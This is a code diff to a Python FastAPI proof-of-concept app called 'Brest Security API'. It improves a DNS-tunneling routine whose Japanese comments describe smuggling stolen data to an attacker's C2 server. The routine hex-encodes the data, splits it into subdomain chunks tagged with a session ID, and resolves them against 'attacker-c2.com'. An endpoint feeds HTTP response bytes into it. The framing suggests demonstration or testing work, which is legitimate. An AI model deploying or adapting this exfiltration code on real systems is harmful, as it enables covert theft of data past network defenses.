@@ -2,6 +2,7 @@ from fastapi import FastAPI
 import requests
 import json
 import dns.resolver
+import uuid
 
 app = FastAPI(
     title="Brest Security API",
@@ -12,13 +13,22 @@ app = FastAPI(
 
 app_base_path = "/poc"
 
+def get_session_id():
+    session_id = str(uuid.uuid4())[:8]
+    return session_id
 
-def dns_tunneling(original_data: str, c2_domain: str):
+
+def dns_tunneling(original_bytes: bytes, c2_domain: str):
     """
     データを外部に盗み出すためにDNSを利用する手法を想定した関数です。
+    original_bytes: 盗み出したいデータのバイト列
+    c2_domain: 攻撃者が管理するC2サーバーのドメイン名
     """
     # 1. 盗んだデータを16進数（hex）に変換
-    data_hex = original_data.encode('utf-8').hex()
+    if isinstance(original_bytes, str):
+        original_bytes = original_bytes.encode('utf-8')
+    
+    data_hex = original_bytes.hex()
 
     # 解決先（resolver）のカスタム設定
     resolver = dns.resolver.Resolver(configure=False)
@@ -28,13 +38,14 @@ def dns_tunneling(original_data: str, c2_domain: str):
     
     # 2. 30文字ずつに分割してループ
     chunk_size = 30
+    session_id = get_session_id()
     for i in range(0, len(data_hex), chunk_size):
         chunk = data_hex[i : i + chunk_size]
         sequence_number = i // chunk_size # 切り捨てて除算
 
         # 3. 連結して完全な形のドメインを作成
         # 例: 0.61646d...attacker-c2.com
-        target_fqdn = f"{sequence_number}.{chunk}.{c2_domain}"
+        target_fqdn = f"{session_id}.{sequence_number}.{chunk}.{c2_domain}"
         print(f"Sending: {target_fqdn}")
 
         try:
@@ -121,7 +132,8 @@ async def execute_command(body: dict):
     print(res.status_code)
     print(res.text)
 
-    dns_tunneling(res.text, "attacker-c2.com")
+    # C2サーバーに文字化けさせず転送するためにcontent（バイト列）を利用する。
+    dns_tunneling(res.content, "attacker-c2.com")
 
     # 検証のために結果を返す。
     return {
